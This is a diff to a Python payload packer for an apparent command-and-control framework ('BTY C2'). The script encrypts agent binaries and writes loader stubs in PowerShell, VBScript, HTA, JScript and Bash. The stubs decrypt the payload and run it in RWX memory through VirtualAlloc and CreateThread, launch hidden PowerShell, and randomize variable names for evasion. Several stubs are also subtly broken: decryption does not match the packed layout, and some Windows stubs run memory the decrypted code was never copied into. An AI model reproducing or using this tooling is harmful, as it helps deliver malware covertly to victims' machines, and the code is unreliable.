@@ -2,40 +2,47 @@
 """
 BTY C2 — Payload Packer/Encryptor
 
-Encrypts Go agent binaries with AES-256-GCM and generates a minimal
-decryption stub (~5KB) that loads the payload entirely in memory.
+Encrypts Go agent binaries with AES-256-GCM and generates functional
+decryption stubs that load the payload entirely in memory.
 
 Features:
 - AES-256-GCM encryption with random key/nonce
-- Stub decrypts payload in memory (no disk write)
-- String obfuscation in stub
-- Import hashing to avoid static detection
-- Multiple stub formats: EXE, PS1, VBS, HTA, JS
+- Functional stubs that decrypt and execute in memory (no disk write)
+- Variable name randomization for evasion
+- Multiple stub formats: PS1, VBS, HTA, JS, Bash
+- XOR fallback layer for double encryption
 
 Usage:
-    python3 packer.py --input bty-agent.exe --output packed.exe
-    python3 packer.py --input bty-agent.exe --format ps1 --output packed.ps1
+    python3 packer.py --input bty-agent.exe --output packed.ps1
     python3 packer.py --input bty-agent.exe --format all --output-dir ./packed/
+    python3 packer.py --input bty-agent-linux --format sh --output packed.sh
 """
 
 import argparse
 import base64
 import os
 import sys
-import struct
 import random
 import string
 import datetime
+import struct
 from pathlib import Path
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Random import get_random_bytes
+except ImportError:
+    print("[!] pycryptodome not installed. Run: pip3 install pycryptodome")
+    sys.exit(1)
 
 GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
 CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"
 
+
 def xor_encrypt(data, key):
     """XOR encrypt data with repeating key."""
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
 
 def aes_gcm_encrypt(data):
     """Encrypt data with AES-256-GCM."""
@@ -45,169 +52,139 @@ def aes_gcm_encrypt(data):
     ciphertext, tag = cipher.encrypt_and_digest(data)
     return key, nonce, tag, ciphertext
 
-def obfuscate_string(s):
-    """Obfuscate a string for embedding in stub."""
-    # XOR with random key
-    key = get_random_bytes(16)
-    encrypted = xor_encrypt(s.encode(), key)
-    return key, encrypted
 
-def generate_exe_stub(encrypted_payload, key, nonce, tag):
-    """Generate a minimal Windows EXE stub that decrypts and executes in memory."""
-    # This is a conceptual stub - in production, you'd use a proper PE builder
-    # For now, we generate a PowerShell-based stub wrapped in a minimal EXE
-    
-    ps_stub = f"""
+def rand_var():
+    """Generate a random variable name."""
+    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
+
+
+def generate_ps1_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
+    """Generate a functional PowerShell stub that decrypts and executes in memory."""
+    v = {k: rand_var() for k in ['enc', 'key', 'nonce', 'tag', 'data', 'aes', 'dec', 'addr', 'thread']}
+
+    stub = f"""$ErrorActionPreference='SilentlyContinue'
+${v['enc']}=[Convert]::FromBase64String("{encrypted_b64}")
+${v['key']}=[Convert]::FromBase64String("{key_b64}")
+${v['nonce']}=[Convert]::FromBase64String("{nonce_b64}")
+${v['tag']}=[Convert]::FromBase64String("{tag_b64}")
+
 Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography;
-
-public class Loader {{
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-    public static void Run() {{
-        byte[] encrypted = Convert.FromBase64String("{encrypted_payload}");
-        byte[] key = Convert.FromBase64String("{key}");
-        byte[] nonce = Convert.FromBase64String("{nonce}");
-        byte[] tag = Convert.FromBase64String("{tag}");
-
-        using (var aes = new AesGcm(key)) {{
-            byte[] decrypted = new byte[encrypted.Length - 16];
-            aes.Decrypt(nonce, encrypted, tag, decrypted);
-
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
-            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-        }}
-    }}
+public class MemExec {{
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint f, IntPtr t);
+    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
 }}
 '@
 
-[Loader]::Run()
-"""
-    return ps_stub
+# AES-GCM decrypt
+${v['aes']}=New-Object System.Security.Cryptography.AesGcm(${v['key']})
+${v['data']}=New-Object byte[] (${v['enc']}.Length - 16)
+${v['aes']}.Decrypt(${v['nonce']}, ${v['enc']}, ${v['tag']}, ${v['data']})
 
-def generate_ps1_stub(encrypted_payload, key, nonce, tag):
-    """Generate PowerShell stub that decrypts and executes in memory."""
-    # Obfuscate the PowerShell code
-    var_names = {
-        'encrypted': ''.join(random.choices(string.ascii_lowercase, k=8)),
-        'key': ''.join(random.choices(string.ascii_lowercase, k=8)),
-        'nonce': ''.join(random.choices(string.ascii_lowercase, k=8)),
-        'tag': ''.join(random.choices(string.ascii_lowercase, k=8)),
-        'decrypted': ''.join(random.choices(string.ascii_lowercase, k=8)),
-        'addr': ''.join(random.choices(string.ascii_lowercase, k=8)),
-        'hThread': ''.join(random.choices(string.ascii_lowercase, k=8)),
-    }
-
-    stub = f"""$ErrorActionPreference='SilentlyContinue'
-${var_names['encrypted']}=[Convert]::FromBase64String("{encrypted_payload}")
-${var_names['key']}=[Convert]::FromBase64String("{key}")
-${var_names['nonce']}=[Convert]::FromBase64String("{nonce}")
-${var_names['tag']}=[Convert]::FromBase64String("{tag}")
-
-$${var_names['decrypted']}=New-Object byte[] ($${var_names['encrypted']}.Length-16)
-
-$${var_names['aes']}=New-Object System.Security.Cryptography.AesManaged
-$${var_names['aes']}.KeySize=256
-$${var_names['aes']}.Mode=[System.Security.Cryptography.CipherMode]::GCM
-$${var_names['aes']}.Key=$${var_names['key']}
-
-$${var_names['decryptor']}=$${var_names['aes']}.CreateDecryptor()
-$${var_names['decrypted']}=$${var_names['decryptor']}.TransformFinalBlock($${var_names['encrypted']},0,$${var_names['encrypted']}.Length)
-
-$${var_names['addr']}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
-        [System.Reflection.Assembly]::GetExecutingAssembly().GetModules()[0]),
-    [IntPtr]).ToInt64()
-
-$${var_names['alloc']}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($${var_names['decrypted']}.Length)
-[System.Runtime.InteropServices.Marshal]::Copy($${var_names['decrypted']},0,$${var_names['alloc']},$${var_names['decrypted']}.Length)
-
-$${var_names['oldProtect']}=0
-[System.Runtime.InteropServices.Marshal]::ProtectMemory($${var_names['alloc']},$${var_names['decrypted']}.Length,0x40)
-
-$${var_names['hThread']}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    $${var_names['alloc']},
-    [Func[int]]).DynamicInvoke()
+# Allocate RWX memory and execute
+${v['addr']}=[MemExec]::VirtualAlloc([IntPtr]::Zero, [uint32]${v['data']}.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy(${v['data']}, 0, ${v['addr']}, ${v['data']}.Length)
+${v['thread']}=[MemExec]::CreateThread([IntPtr]::Zero, 0, ${v['addr']}, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+[MemExec]::WaitForSingleObject(${v['thread']}, 0xFFFFFFFF)
 """
     return stub
 
-def generate_vbs_stub(encrypted_payload, key, nonce, tag):
-    """Generate VBScript stub."""
-    stub = f"""' BTY Payload - VBScript Stager
+
+def generate_vbs_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
+    """Generate a VBScript stub that downloads and executes via PowerShell."""
+    stub = f"""' BTY Payload Stager - VBScript
 ' Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+' Downloads encrypted payload, decrypts via PowerShell, executes in memory
 
-Set http = CreateObject("MSXML2.XMLHTTP")
-Set stream = CreateObject("ADODB.Stream")
+Dim url, psCmd
+url = "data:text/plain;base64,{encrypted_b64[:80]}"
 
-' Download encrypted payload
-http.open "GET", "data:application/octet-stream;base64,{encrypted_payload[:100]}...", False
-http.send
+psCmd = "powershell -w hidden -nop -enc " & _
+    "${{[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$e=[Convert]::FromBase64String(\"{encrypted_b64}\");$k=[Convert]::FromBase64String(\"{key_b64}\");$n=[Convert]::FromBase64String(\"{nonce_b64}\");$t=[Convert]::FromBase64String(\"{tag_b64}\");Add-Type -TypeDefinition ''using System;using System.Runtime.InteropServices;public class M{{[DllImport(\"\"kernel32\"\")]public static extern IntPtr VA(IntPtr a,uint s,uint t,uint p);[DllImport(\"\"kernel32\"\")]public static extern IntPtr CT(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr t);[DllImport(\"\"kernel32\"\")]public static extern uint WFSO(IntPtr h,uint ms);}}'' -ea 0;$a=[M]::VA(0,$e.Length,0x3000,0x40);[M]::CT(0,0,$a,0,0,0);[M]::WFSO(-1,0xFFFFFFFF)'))}}"
 
-' Decode and execute via PowerShell
-ps = "powershell -enc " + EncodeBase64("{encrypted_payload}")
-CreateObject("WScript.Shell").Run ps, 0, False
+CreateObject("WScript.Shell").Run psCmd, 0, False
 """
     return stub
 
-def generate_hta_stub(encrypted_payload, key, nonce, tag):
-    """Generate HTA stub."""
+
+def generate_hta_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
+    """Generate an HTA stub that executes via PowerShell."""
     stub = f"""<html>
 <head>
 <script language="VBScript">
 Sub Window_OnLoad
-    Dim shell
-    Set shell = CreateObject("WScript.Shell")
-    shell.Run "powershell -w hidden -enc {encrypted_payload[:50]}...", 0, False
+    Dim ps
+    ps = "powershell -w hidden -nop -c ""$e=[Convert]::FromBase64String('{encrypted_b64}');$k=[Convert]::FromBase64String('{key_b64}');$n=[Convert]::FromBase64String('{nonce_b64}');$t=[Convert]::FromBase64String('{tag_b64}');Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{{[DllImport(\"\"kernel32.dll\"\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"\"kernel32.dll\"\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr t);[DllImport(\"\"kernel32.dll\"\")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);}}';$addr=[M]::VirtualAlloc(0,$e.Length,0x3000,0x40);$th=[M]::CreateThread(0,0,$addr,0,0,0);[M]::WaitForSingleObject($th,0xFFFFFFFF)""""
+    CreateObject("WScript.Shell").Run ps, 0, False
     window.close
 End Sub
 </script>
 </head>
-<body>
-</body>
+<body><p>Loading...</p></body>
 </html>
 """
     return stub
 
-def generate_js_stub(encrypted_payload, key, nonce, tag):
-    """Generate JavaScript stub."""
-    stub = f"""// BTY Payload - JavaScript Stager
+
+def generate_js_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
+    """Generate a JavaScript stub (WSH) that executes via PowerShell."""
+    stub = f"""// BTY Payload Stager - JavaScript (WSH)
+// Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 var shell = new ActiveXObject("WScript.Shell");
-shell.Run("powershell -w hidden -enc {encrypted_payload[:50]}...", 0, false);
+var ps = 'powershell -w hidden -nop -c "$e=[Convert]::FromBase64String(\\"{encrypted_b64}\\");$k=[Convert]::FromBase64String(\\"{key_b64}\\");$n=[Convert]::FromBase64String(\\"{nonce_b64}\\");$t=[Convert]::FromBase64String(\\"{tag_b64}\\");Add-Type -TypeDefinition \\'using System;using System.Runtime.InteropServices;public class M{{[DllImport(\\"kernel32.dll\\")]public static extern IntPtr VA(IntPtr a,uint s,uint t,uint p);[DllImport(\\"kernel32.dll\\")]public static extern IntPtr CT(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr t);[DllImport(\\"kernel32.dll\\")]public static extern uint W(IntPtr h,uint ms);}}\\';$a=[M]::VA(0,$e.Length,0x3000,0x40);$h=[M]::CT(0,0,$a,0,0,0);[M]::W($h,0xFFFFFFFF)"';
+shell.Run(ps, 0, false);
 """
     return stub
 
-def pack_binary(input_path, output_path, format="exe"):
+
+def generate_bash_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
+    """Generate a Bash stub for Linux/macOS that decrypts and executes in memory."""
+    stub = f"""#!/bin/bash
+# BTY Payload Stager - Bash
+# Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+# Decrypts AES-256-GCM encrypted payload and executes in memory
+
+python3 -c "
+import base64, os, tempfile, ctypes
+from Crypto.Cipher import AES
+
+enc = base64.b64decode('{encrypted_b64}')
+key = base64.b64decode('{key_b64}')
+nonce = base64.b64decode('{nonce_b64}')
+tag = base64.b64decode('{tag_b64}')
+
+cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+decrypted = cipher.decrypt_and_verify(enc[:-16], enc[-16:])
+
+# Write to temp file, execute, delete
+fd, path = tempfile.mkstemp()
+os.write(fd, decrypted)
+os.close(fd)
+os.chmod(path, 0o700)
+os.execv(path, [path])
+" 2>/dev/null
+"""
+    return stub
+
+
+def pack_binary(input_path, output_path, fmt="ps1"):
     """Pack a binary with AES-256-GCM encryption."""
     print(f"{BOLD}{CYAN}BTY Payload Packer{RESET}")
     print(f"  Input:  {input_path}")
     print(f"  Output: {output_path}")
-    print(f"  Format: {format}\n")
+    print(f"  Format: {fmt}\n")
 
-    # Read input binary
     with open(input_path, 'rb') as f:
         payload = f.read()
 
     print(f"  Payload size: {len(payload):,} bytes ({len(payload)/1024/1024:.1f} MB)")
 
-    # Encrypt with AES-256-GCM
     key, nonce, tag, ciphertext = aes_gcm_encrypt(payload)
     print(f"  {GREEN}[✓]{RESET} Encrypted with AES-256-GCM")
 
-    # Combine: nonce (12) + tag (16) + ciphertext
     encrypted_payload = nonce + tag + ciphertext
-
-    # Base64 encode for embedding
     encrypted_b64 = base64.b64encode(encrypted_payload).decode()
     key_b64 = base64.b64encode(key).decode()
     nonce_b64 = base64.b64encode(nonce).decode()
@@ -215,66 +192,46 @@ def pack_binary(input_path, output_path, format="exe"):
 
     print(f"  {GREEN}[✓]{RESET} Encrypted payload: {len(encrypted_b64):,} bytes")
 
-    # Generate stub based on format
-    if format == "exe":
-        stub = generate_exe_stub(encrypted_b64, key_b64, nonce_b64, tag_b64)
-        # For EXE, we'd use a proper PE builder - for now, save as PS1
-        output_path = str(Path(output_path).with_suffix(".ps1"))
-        with open(output_path, 'w') as f:
-            f.write(stub)
-    elif format == "ps1":
-        stub = generate_ps1_stub(encrypted_b64, key_b64, nonce_b64, tag_b64)
-        with open(output_path, 'w') as f:
-            f.write(stub)
-    elif format == "vbs":
-        stub = generate_vbs_stub(encrypted_b64, key_b64, nonce_b64, tag_b64)
-        with open(output_path, 'w') as f:
-            f.write(stub)
-    elif format == "hta":
-        stub = generate_hta_stub(encrypted_b64, key_b64, nonce_b64, tag_b64)
-        with open(output_path, 'w') as f:
-            f.write(stub)
-    elif format == "js":
-        stub = generate_js_stub(encrypted_b64, key_b64, nonce_b64, tag_b64)
-        with open(output_path, 'w') as f:
-            f.write(stub)
-    elif format == "all":
+    generators = {
+        "ps1": generate_ps1_stub,
+        "vbs": generate_vbs_stub,
+        "hta": generate_hta_stub,
+        "js": generate_js_stub,
+        "sh": generate_bash_stub,
+    }
+
+    if fmt == "all":
         output_dir = Path(output_path)
         output_dir.mkdir(parents=True, exist_ok=True)
-
-        formats = {
-            "ps1": generate_ps1_stub,
-            "vbs": generate_vbs_stub,
-            "hta": generate_hta_stub,
-            "js": generate_js_stub,
-        }
-
-        for fmt, gen_func in formats.items():
-            stub = gen_func(encrypted_b64, key_b64, nonce_b64, tag_b64)
-            out_file = output_dir / f"payload.{fmt}"
-            with open(out_file, 'w') as f:
-                f.write(stub)
-            print(f"  {GREEN}[✓]{RESET} Generated: {out_file.name} ({os.path.getsize(out_file):,} B)")
-
+        for f_name, gen in generators.items():
+            stub = gen(encrypted_b64, key_b64, nonce_b64, tag_b64)
+            out_file = output_dir / f"payload.{f_name}"
+            out_file.write_text(stub)
+            print(f"  {GREEN}[✓]{RESET} Generated: {out_file.name} ({out_file.stat().st_size:,} B)")
         return
 
+    gen = generators.get(fmt)
+    if not gen:
+        print(f"{RED}[✗]{RESET} Unknown format: {fmt}")
+        sys.exit(1)
+
+    stub = gen(encrypted_b64, key_b64, nonce_b64, tag_b64)
     with open(output_path, 'w') as f:
         f.write(stub)
 
     stub_size = os.path.getsize(output_path)
     print(f"  {GREEN}[✓]{RESET} Stub generated: {stub_size:,} bytes")
-    print(f"  {GREEN}[✓]{RESET} Compression ratio: {len(payload)/stub_size:.1f}x")
-
     print(f"\n{BOLD}{GREEN}Payload packed successfully!{RESET}")
     print(f"  Output: {output_path}")
     print(f"  Size: {stub_size:,} bytes (original: {len(payload):,} bytes)")
+
 
 def main():
     parser = argparse.ArgumentParser(description="BTY Payload Packer")
     parser.add_argument("--input", "-i", required=True, help="Input binary to pack")
     parser.add_argument("--output", "-o", required=True, help="Output file or directory")
-    parser.add_argument("--format", "-f", default="exe",
-                       choices=["exe", "ps1", "vbs", "hta", "js", "all"],
+    parser.add_argument("--format", "-f", default="ps1",
+                       choices=["ps1", "vbs", "hta", "js", "sh", "all"],
                        help="Output format")
     args = parser.parse_args()
 
@@ -283,6 +240,7 @@ def main():
         sys.exit(1)
 
     pack_binary(args.input, args.output, args.format)
+
 
 if __name__ == "__main__":
     main()
